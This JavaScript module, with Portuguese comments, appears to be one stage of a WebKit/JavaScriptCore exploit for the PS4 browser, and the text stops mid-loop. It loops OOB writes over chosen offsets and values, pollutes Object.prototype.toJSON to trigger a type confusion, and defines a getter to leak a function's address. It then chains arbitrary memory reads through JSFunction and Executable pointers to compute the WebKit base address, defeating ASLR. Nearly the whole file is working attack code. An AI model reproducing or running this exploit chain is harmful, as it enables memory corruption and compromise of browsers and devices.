// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43L - Addrof com Getter)
// ATUALIZADO PARA TESTES MASSIVOS E CONFIG.MJS (REVISÃO SINTAXE)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // WEBKIT_LIBRARY_INFO não é usado diretamente aqui, mas pode ser pelo chamador

// Nome do módulo exportado, pode ser usado pelo runner.
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak_Massive";

const VICTIM_BUFFER_SIZE = 256;

const CRITICAL_WRITE_OFFSETS_R43L = [
    0x7C, // Original
    0x78,
    0x80,
    0x70,
    0x6C,
    0x5C,
    0x8C
];

// Certifique-se que JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID é um número ou será filtrado.
const OOB_WRITE_VALUES_R43L = [
    0xABABABAB,
    0x12345678,
    0x87654321,
    (typeof JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID === 'number' ? JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID : undefined),
    0x00000000,
    0xFFFFFFFF,
    0x00000001,
    0x41414141, // 'AAAA'
    0x42424242, // 'BBBB'
].filter(v => v !== undefined); // Remove undefined entries, como StructureIDs nulas

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = Math.random();
const PROBE_CALL_LIMIT_V82 = 10; // Limite para evitar recursão infinita na sonda

// Offsets para WebKit Leak, usando config.mjs
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);

// !! ATENÇÃO !! Este offset é relativo à instância Executable.
// O config.mjs fornecido não detalha a estrutura Executable.
// Mantendo o valor original de 0x8. Valide este offset com seu disassembly.
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8; // Deve ser um número simples
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL); // Converte para AdvancedInt64

let targetFunctionForLeak;
let leaked_target_function_addr = null; // Module-level, mas resetado por iteração

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) {
        logS3(`[isValidPointer-${context}] Input não é AdvancedInt64Object: ${String(ptr)}`, "debug_detail");
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();

    if (high === 0 && low === 0) {
        logS3(`[isValidPointer-${context}] Ponteiro NULO (0x0) detectado para ${ptr.toString(true)}.`, "debug_detail");
        return false;
    }
    if (high === 0x7FF80000 && low === 0x0) { // Nosso NaN específico do log anterior
        logS3(`[isValidPointer-${context}] Ponteiro específico NaN (0x7ff8000000000000) detectado para ${ptr.toString(true)}.`, "debug_detail");
        return false;
    }
    // Verificação de NaN genérico (IEEE 754 double precision)
    // Um NaN tem todos os bits do expoente em 1 (0x7FF) e a mantissa não-zero.
    // Para um double de 64 bits, o bit de sinal é o 63, expoente bits 62-52, mantissa bits 51-0.
    // High word (32 bits mais significativos de um Int64):
    // Se (high & 0x7FF00000) === 0x7FF00000, então o expoente está preenchido.
    // E se a parte da mantissa em 'high' (high & 0x000FFFFF) for não-zero, OU 'low' for não-zero, é um NaN.
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) {
         logS3(`[isValidPointer-${context}] Potencial NaN (não apenas 0x7ff8...) detectado: ${ptr.toString(true)}`, "debug_detail");
        return false;
    }
    if (high === 0 && low < 0x10000) { // Limite inferior para ponteiros válidos
        logS3(`[isValidPointer-${context}] Ponteiro baixo (provavelmente NULL page) detectado: ${ptr.toString(true)}`, "debug_detail");
        return false;
    }
    // Adicionar outras verificações específicas do PS4 12.02 se conhecidas
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Addrof + WebKit Base Leak (R43L Massive SyntaxReview) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R43L MassiveSR...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_Instance_MassiveSR() { return `target_R43L_MassiveSR_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, 'info');

    logS3(`--- Fase 0 (R43L MassiveSR): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message || String(e_sanity)}`, "critical", FNAME_CURRENT_TEST_BASE);
        coreOOBReadWriteOK = false;
    }
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) {
        logS3(`Sanity check OOB falhou. Abortando ${FNAME_CURRENT_TEST_BASE}.`, "critical", FNAME_CURRENT_TEST_BASE);
        document.title = `${FNAME_CURRENT_TEST_BASE} OOB Sanity Fail!`;
        return { // Retornar objeto de resultado consistente com o sucesso
            errorOccurred: "OOB Sanity Check Failed",
            tc_probe_details: null, stringifyResult: null,
            addrof_result: { success: false, msg: "Addrof (R43L MassiveSR): Not run due to OOB Sanity Fail.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
            webkit_leak_result: { success: false, msg: "WebKit Leak (R43L MassiveSR): Not run due to OOB Sanity Fail.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
            iteration_results_summary: [],
            total_probe_calls_last_iter: 0,
            oob_params_of_best_result: null,
            heisenbug_on_M2_in_best_result: false
        };
    }

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (R43L MassiveSR): Not run.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R43L MassiveSR): Not run.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_params_of_best_result: null, // { offset: null, value: null, raw_value: null, raw_offset: null }
        heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0; // Para a última iteração bem-sucedida ou a última tentada

    for (const current_critical_offset of CRITICAL_WRITE_OFFSETS_R43L) {
        for (const current_oob_value of OOB_WRITE_VALUES_R43L) {
            // leaked_target_function_addr é resetado aqui, pois é o que addrof tenta popular
            leaked_target_function_addr = null;
            const current_oob_hex_val = toHex(current_oob_value); // Assume que current_oob_value é numérico
            const current_offset_hex = toHex(current_critical_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_OOB${current_oob_hex_val}`;
            logS3(`\n===== ITERATION R43L MassiveSR: Offset: ${current_offset_hex}, OOB Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Testing Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let probe_call_count_iter = 0;
            let victim_typed_array_ref_iter = null; // Específico da iteração
            let marker_M1_ref_iter = null;         // Específico da iteração
            let marker_M2_ref_iter = null;         // Específico da iteração
            let iteration_final_tc_details_from_probe = null; // Específico da iteração
            let iteration_tc_first_detection_done = false;    // Específico da iteração
            let iter_addrof_result = { success: false, msg: "Addrof (R43L MassiveSR): Not run in this iter.", leaked_object_addr: null, leaked_object_addr_candidate_str: null }; // Específico da iteração

            function toJSON_TA_Probe_Iter_Closure_R43L_MassiveSR() { // Closure captura as variáveis acima
                probe_call_count_iter++;
                const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) {
                        logS3(`[PROBE_R43L_MassiveSR] Call #${call_num}: Limite de chamadas atingido. Parando.`, "warn");
                        return { r_stop: "limit_exceeded", call_num: call_num };
                    }
                    if (call_num === 1 && this === victim_typed_array_ref_iter) {
                        marker_M2_ref_iter = { marker_id_v82_massive_sr: "M2_Iter_R43L_MassiveSR" };
                        marker_M1_ref_iter = { marker_id_v82_massive_sr: "M1_Iter_R43L_MassiveSR", payload_M2: marker_M2_ref_iter };
                        logS3(`[PROBE_R43L_MassiveSR] Call #${call_num}: 'this' é victim_typed_array. M1/M2 criados.`, "debug");
                        return marker_M1_ref_iter;
                    } else if (is_m2c) {
                        if (!iteration_tc_first_detection_done) {
                            iteration_tc_first_detection_done = true;
                            iteration_final_tc_details_from_probe = {
                                call_number_tc_detected: call_num, probe_variant: "TA_Probe_R43L_MassiveSR", this_type: "[object Object]",
                                this_is_M2: true, getter_defined: false, getter_fired: false,
                                leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                            };
                            logS3(`[PROBE_R43L_MassiveSR] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_v82_massive_sr}. Definindo getter...`, "vuln");

                            try {
                                Object.defineProperty(this, 'leaky_addr_getter_R43L_MassiveSR', {
                                    get: function() { // Este getter acessa iter_addrof_result, iteration_final_tc_details_from_probe, victim_typed_array_ref_iter e targetFunctionForLeak
                                        logS3(`[PROBE_R43L_GETTER_MassiveSR] Getter 'leaky_addr_getter_R43L_MassiveSR' ACIONADO!`, "vuln");
                                        if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_fired = true;

                                        if (!victim_typed_array_ref_iter || !victim_typed_array_ref_iter.buffer) { // Checagem dupla
                                            iter_addrof_result.msg = "AddrofGetter (R43L MassiveSR): victim_typed_array_ref_iter.buffer é nulo/inválido.";
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = "addrof_victim_null";
                                            return "getter_victim_null_or_invalid";
                                        }
                                        if (typeof targetFunctionForLeak !== 'function') {
                                            iter_addrof_result.msg = "AddrofGetter (R43L MassiveSR): targetFunctionForLeak não é uma função.";
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = "addrof_target_invalid";
                                            return "getter_target_invalid";
                                        }

                                        let float_view = new Float64Array(victim_typed_array_ref_iter.buffer);
                                        let uint32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
                                        const original_low = uint32_view[0]; const original_high = uint32_view[1];
                                        const original_float_val = float_view[0]; // Salva o valor float original

                                        try {
                                            float_view[0] = targetFunctionForLeak;
                                            const current_float_val_after_write = float_view[0]; // Ler de volta o float

                                            const leaked_low = uint32_view[0];
                                            const leaked_high = uint32_view[1];
                                            logS3(`[PROBE_R43L_GETTER_DEBUG_MassiveSR] Original float no buffer: ${original_float_val}`, "leak_detail");
                                            logS3(`[PROBE_R43L_GETTER_DEBUG_MassiveSR] Original bits: L:0x${original_low.toString(16)} H:0x${original_high.toString(16)}`, "leak_detail");
                                            logS3(`[PROBE_R43L_GETTER_DEBUG_MassiveSR] Float após escrita obj: ${typeof current_float_val_after_write === 'function' ? 'Function Object' : String(current_float_val_after_write)}`, "leak_detail");
                                            logS3(`[PROBE_R43L_GETTER_DEBUG_MassiveSR] Raw bits após escrita obj: L:0x${leaked_low.toString(16)} H:0x${leaked_high.toString(16)}`, "leak");

                                            if (current_float_val_after_write !== targetFunctionForLeak) {
                                                logS3(`[PROBE_R43L_GETTER_WARN_MassiveSR] Escrita de targetFunctionForLeak em float_view[0] não resultou no objeto esperado! float_view[0] é ${typeof current_float_val_after_write}.`, "warn");
                                                // Não necessariamente um erro fatal para addrof, mas a causa deve ser investigada.
                                            }

                                            const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
                                            iter_addrof_result.leaked_object_addr_candidate_str = potential_addr.toString(true);
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = iter_addrof_result.leaked_object_addr_candidate_str;

                                            if (isValidPointer(potential_addr, "_getterAddrof_MassiveSR")) {
                                                leaked_target_function_addr = potential_addr; // Atribui ao module-level var
                                                iter_addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true);
                                                iter_addrof_result.success = true;
                                                iter_addrof_result.msg = "AddrofGetter (R43L MassiveSR): Sucesso ao obter endereço candidato da função.";
                                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_is_ptr = true;
                                                logS3(`[PROBE_R43L_GETTER_MassiveSR] SUCESSO! Addr: ${leaked_target_function_addr.toString(true)}`, "vuln");
                                                return "getter_addrof_success";
                                            } else {
                                                iter_addrof_result.msg = `AddrofGetter (R43L MassiveSR): Endereço candidato (${iter_addrof_result.leaked_object_addr_candidate_str}) não parece ponteiro válido.`;
                                                if (leaked_low === original_low && leaked_high === original_high && current_float_val_after_write !== targetFunctionForLeak) {
                                                     iter_addrof_result.msg += " Conteúdo do buffer não alterado significativamente pela escrita do objeto, ou escrita falhou.";
                                                     logS3(`[PROBE_R43L_GETTER_MassiveSR] Conteúdo do buffer não foi alterado (ou escrita falhou). Bits originais: L:0x${original_low.toString(16)}, H:0x${original_high.toString(16)}`, "warn");
                                                }
                                                return "getter_addrof_invalid_ptr";
                                            }
                                        } catch (e_addrof_getter) {
                                            iter_addrof_result.msg = `AddrofGetter (R43L MassiveSR) EXCEPTION: ${e_addrof_getter.message || String(e_addrof_getter)}`;
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = `addrof_getter_ex:${e_addrof_getter.message || String(e_addrof_getter)}`;
                                            console.error("[PROBE_R43L_GETTER_MassiveSR] Exceção:", e_addrof_getter);
                                            return "getter_addrof_exception";
                                        } finally {
                                            uint32_view[0] = original_low; // Restaurar
                                            uint32_view[1] = original_high;
                                            logS3(`[PROBE_R43L_GETTER_DEBUG_MassiveSR] Buffer restaurado para L:0x${uint32_view[0].toString(16)} H:0x${uint32_view[1].toString(16)}`, "debug_detail");
                                        }
                                    },
                                    enumerable: true, configurable: true
                                });
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_defined = true;
                                logS3(`[PROBE_R43L_MassiveSR] Getter 'leaky_addr_getter_R43L_MassiveSR' definido em M2.`, "debug");
                            } catch (e_def_getter) {
                                logS3(`[PROBE_R43L_MassiveSR] ERRO ao definir getter em M2: ${e_def_getter.message || String(e_def_getter)}`, "error");
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + `DefineGetterErr: ${e_def_getter.message || String(e_def_getter)}`;
                            }
                        }
                        return this;
                    }
                } catch (e_pm) { // Erro principal na sonda
                    if (!iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe = {}; // Garantir que existe
                    iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + `ProbeMainErr:${e_pm.message || String(e_pm)}`;
                    console.error("[PROBE_R43L_MassiveSR] Erro principal na sonda:", e_pm);
                    logS3(`[PROBE_R43L_MassiveSR] Call #${call_num}: Erro na sonda: ${e_pm.message || String(e_pm)}`, "error");
                    return { err_pm: call_num, msg: e_pm.message || String(e_pm), type: ctts };
                }
                // Se não for M2C nem a primeira chamada, apenas logar e retornar tipo
                logS3(`[PROBE_R43L_MassiveSR] Call #${call_num}: 'this' é ${ctts}. Retornando tipo.`, "debug_detail");
                return { gen_m: call_num, type: ctts };
            } // Fim da closure toJSON_TA_Probe_Iter_Closure_R43L_MassiveSR

            let iter_raw_stringify_output = null;
            let iter_stringify_output_parsed = null;
            let iter_primary_error = null; // Erro primário da iteração
            let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R43L MassiveSR): Not run in this iter.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null };
            let heisenbugConfirmedThisIter = false;

            try {
                logS3(`  --- Fase 1 (R43L MassiveSR): Detecção de Type Confusion & Addrof via Getter (Offset: ${current_offset_hex}, Val: ${current_oob_hex_val}) ---`, "subtest", FNAME_CURRENT_ITERATION);
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
                oob_write_absolute(current_critical_offset, current_oob_value, 4);
                logS3(`   OOB Write: Escrito valor ${current_oob_hex_val} (tipo: ${typeof current_oob_value}) no offset ${current_offset_hex}`, 'info');
                await PAUSE_S3(150);

                victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
                new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
                logS3(`   Victim TypedArray criado e preenchido com padrão: ${FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD}`, 'debug_detail');

                const ppKey = 'toJSON';
                let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
                let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R43L_MassiveSR, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    logS3(`   Object.prototype.toJSON poluído com sonda. Chamando JSON.stringify...`, 'debug');
                    iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); // Aciona a sonda
                    try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: String(iter_raw_stringify_output).slice(0, 500), msg: e_p.message || String(e_p) }; } // Limitar tamanho do raw stringify
                    logS3(`   JSON.stringify output (parsed type): ${typeof iter_stringify_output_parsed}, (raw): ${String(iter_raw_stringify_output).slice(0,200)}...`, 'debug_detail');


                    if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                        heisenbugConfirmedThisIter = true;
                        logS3(`  TC Probe R43L MassiveSR: TC on M2 CONFIRMED. Getter def: ${iteration_final_tc_details_from_probe.getter_defined}. Getter fired: ${iteration_final_tc_details_from_probe.getter_fired}. Addrof success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || iter_addrof_result.leaked_object_addr_candidate_str || 'N/A'}`, iter_addrof_result.success ? "vuln" : "warn", FNAME_CURRENT_ITERATION);
                    } else {
                        logS3(`  TC Probe R43L MassiveSR: TC on M2 NOT Confirmed. Details: ${iteration_final_tc_details_from_probe ? JSON.stringify(iteration_final_tc_details_from_probe).slice(0,500) : 'N/A'}`, "error", FNAME_CURRENT_ITERATION);
                    }
                } catch (e_str) {
                    if (!iter_primary_error) iter_primary_error = e_str;
                    logS3(`  TC/Addrof Probe R43L MassiveSR: JSON.stringify EXCEPTION: ${e_str.message || String(e_str)}`, "error", FNAME_CURRENT_ITERATION);
                    console.error("Erro no stringify R43L MassiveSR:", e_str);
                    if (!iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe = {};
                    iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + ` StringifyErr: ${e_str.message || String(e_str)}`;
                } finally {
                    if (polluted) {
                        if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                        logS3(`   Object.prototype.toJSON restaurado.`, 'debug');
                    }
                }
                logS3(`  --- Fase 1 (R43L MassiveSR) Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} ---`, heisenbugConfirmedThisIter && iter_addrof_result.success ? "good" : "subtest_warn", FNAME_CURRENT_ITERATION);
                await PAUSE_S3(100);

                // Fase 2: WebKit Leak
                logS3(`  --- Fase 2 (R43L MassiveSR): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
                if (heisenbugConfirmedThisIter && iter_addrof_result.success && leaked_target_function_addr) {
                    if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-PreArbReadCheck`)) {
                        logS3(`   WebKitLeak: Ambiente OOB não está pronto. Tentando re-inicializar...`, "warn", FNAME_CURRENT_ITERATION);
                        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-PreArbReadCheckReinit` });
                    }

                    if (!isOOBReady()) {
                        iter_webkit_leak_result.msg = "WebKit Leak (R43L MassiveSR): Falha ao preparar/re-preparar ambiente OOB para arb_read.";
                        logS3(`   ${iter_webkit_leak_result.msg}`, "error", FNAME_CURRENT_ITERATION);
                    } else {
                        try {
                            logS3(`  WebKitLeak: Endereço da função alvo (leaked_target_function_addr): ${leaked_target_function_addr.toString(true)}`, 'info', FNAME_CURRENT_ITERATION);

                            const ptr_to_executable_instance = await arb_read(leaked_target_function_addr.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            iter_webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_to_executable_instance) ? ptr_to_executable_instance.toString(true) : String(ptr_to_executable_instance);
                            if (!isValidPointer(ptr_to_executable_instance, "_execInst_MassiveSR")) {
                                throw new Error(`Ponteiro para ExecutableInstance inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage1}`);
                            }
                            logS3(`  WebKitLeak: Ponteiro para ExecutableInstance lido de [func_addr + ${FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE.toString(true)}]: ${ptr_to_executable_instance.toString(true)}`, 'leak', FNAME_CURRENT_ITERATION);

                            const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_instance.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                            iter_webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_to_jit_or_vm) ? ptr_to_jit_or_vm.toString(true) : String(ptr_to_jit_or_vm);
                            if (!isValidPointer(ptr_to_jit_or_vm, "_jitVm_MassiveSR")) {
                                throw new Error(`Ponteiro para JIT/VM inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage2}`);
                            }
                            logS3(`  WebKitLeak: Ponteiro para JIT/VM lido de [exec_addr + ${EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM.toString(true)}]: ${ptr_to_jit_or_vm.toString(true)}`, 'leak', FNAME_CURRENT_ITERATION);

                            const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF); // Máscara para alinhar em página de 4KB
                            const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);

                            iter_webkit_leak_result.webkit_base_candidate = webkit_base_candidate.toString(true);
                            iter_webkit_leak_result.success = true;
                            iter_webkit_leak_result.msg = `WebKitLeak (R43L MassiveSR): Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`;
                            logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln", FNAME_CURRENT_ITERATION);

                        } catch (e_webkit_leak) {
                            iter_webkit_leak_result.msg = `WebKitLeak (R43L MassiveSR) EXCEPTION: ${e_webkit_leak.message || String(e_webkit_leak)}`;
                            logS3(`  WebKitLeak: ERRO - ${iter_webkit_leak_result.msg}`, "error", FNAME_CURRENT_ITERATION);
                            if (!iter_primary_error) iter_primary_error = e_webkit_leak;
                            console.error("Erro no WebKitLeak R43L MassiveSR:", e_webkit_leak);
                        }
                    }
                } else {
                    let skipMsg = "WebKitLeak (R43L MassiveSR): Pulado. ";
                    if (!heisenbugConfirmedThisIter) skipMsg += "TC Fase 1 falhou. ";
                    if (!iter_addrof_result.success) skipMsg += "Addrof falhou. ";
                    if (!leaked_target_function_addr) skipMsg += "Endereço da função alvo não obtido. ";
                    iter_webkit_leak_result.msg = skipMsg;
                    logS3(skipMsg, "warn", FNAME_CURRENT_ITERATION);
                }
                logS3(`  --- Fase 2 (R43L MassiveSR) Concluída. WebKitLeak Sucesso: ${iter_webkit_leak_result.success} ---`, iter_webkit_leak_result.success ? "good" : "subtest_warn", FNAME_CURRENT_ITERATION);

            } catch (e_outer_iter) { // Captura erros da iteração externa
                if (!iter_primary_error) iter_primary_error = e_outer_iter;
                logS3(`  CRITICAL ERROR ITERATION R43L MassiveSR (Off:${current_offset_hex},Val:${current_oob_hex_val}): ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
                console.error(`Outer error in iteration R43L MassiveSR (Off:${current_offset_hex},Val:${current_oob_hex_val}):`, e_outer_iter);
                if (!iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe = {};
                iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + ` OuterIterErr: ${e_outer_iter.message || String(e_outer_iter)}`;
            } finally {
                await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR43LMassiveSR` });
            }

            final_probe_call_count_for_report = probe_call_count_iter;

            let current_iter_summary = {
                oob_offset: current_offset_hex,
                oob_value: current_oob_hex_val,
                raw_oob_value: current_oob_value, // Salvar valor raw para análise
                raw_oob_offset: current_critical_offset, // Salvar offset raw
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null,
                stringifyResult: iter_stringify_output_parsed,
                addrof_result_this_iter: iter_addrof_result,
                webkit_leak_result_this_iter: iter_webkit_leak_result,
                heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_for_runner
            if (current_iter_summary.error === null) {
                let current_is_better_than_best = false;
                if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_params_of_best_result === null) {
                    current_is_better_than_best = true;
                } else {
                    const current_score = (current_iter_summary.webkit_leak_result_this_iter.success ? 4 : 0) +
                                          (current_iter_summary.addrof_result_this_iter.success ? 2 : 0) +
                                          (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                    const best_score = (best_result_for_runner.webkit_leak_result.success ? 4 : 0) +
                                       (best_result_for_runner.addrof_result.success ? 2 : 0) +
                                       (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                    if (current_score > best_score) {
                        current_is_better_than_best = true;
                    }
                }

                if (current_is_better_than_best) {
                    best_result_for_runner = {
                        errorOccurred: null,
                        tc_probe_details: current_iter_summary.tc_probe_details,
                        stringifyResult: current_iter_summary.stringifyResult,
                        addrof_result: current_iter_summary.addrof_result_this_iter,
                        webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                        oob_params_of_best_result: {
                            offset: current_offset_hex, value: current_oob_hex_val,
                            raw_value: current_oob_value, raw_offset: current_critical_offset
                        },
                        heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
                    };
                    logS3(`*** NOVO MELHOR RESULTADO ENCONTRADO com Offset: ${current_offset_hex}, Valor: ${current_oob_hex_val} ***`, "success_major", FNAME_CURRENT_ITERATION);
                    logS3(`    Detalhes do Melhor: Addrof=${best_result_for_runner.addrof_result.success}, WebKitLeak=${best_result_for_runner.webkit_leak_result.success}, TC=${best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe}`, "success_major", FNAME_CURRENT_ITERATION);
                }
            } else if (best_result_for_runner.oob_params_of_best_result === null &&
                       current_critical_offset === CRITICAL_WRITE_OFFSETS_R43L[CRITICAL_WRITE_OFFSETS_R43L.length - 1] &&
                       OOB_WRITE_VALUES_R43L.indexOf(current_oob_value) === OOB_WRITE_VALUES_R43L.length - 1) {
                // Se todas as iterações falharem com erro, o último erro é registrado
                best_result_for_runner = {
                    errorOccurred: current_iter_summary.error,
                    tc_probe_details: current_iter_summary.tc_probe_details,
                    stringifyResult: current_iter_summary.stringifyResult,
                    addrof_result: current_iter_summary.addrof_result_this_iter,
                    webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                    oob_params_of_best_result: {
                        offset: current_offset_hex, value: current_oob_hex_val,
                        raw_value: current_oob_value, raw_offset: current_critical_offset
                    },
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
                };
            }

            if (iter_webkit_leak_result.success) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} WebKitLeak OK! (O:${current_offset_hex} V:${current_oob_hex_val})`;
            else if (iter_addrof_result.success) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Addrof OK (O:${current_offset_hex} V:${current_oob_hex_val})`;
            else if (heisenbugConfirmedThisIter) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} TC OK (O:${current_offset_hex} V:${current_oob_hex_val})`;
            else document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Iter Done (O:${current_offset_hex} V:${current_oob_hex_val})`;

            await PAUSE_S3(50); // Pausa menor entre sub-iterações
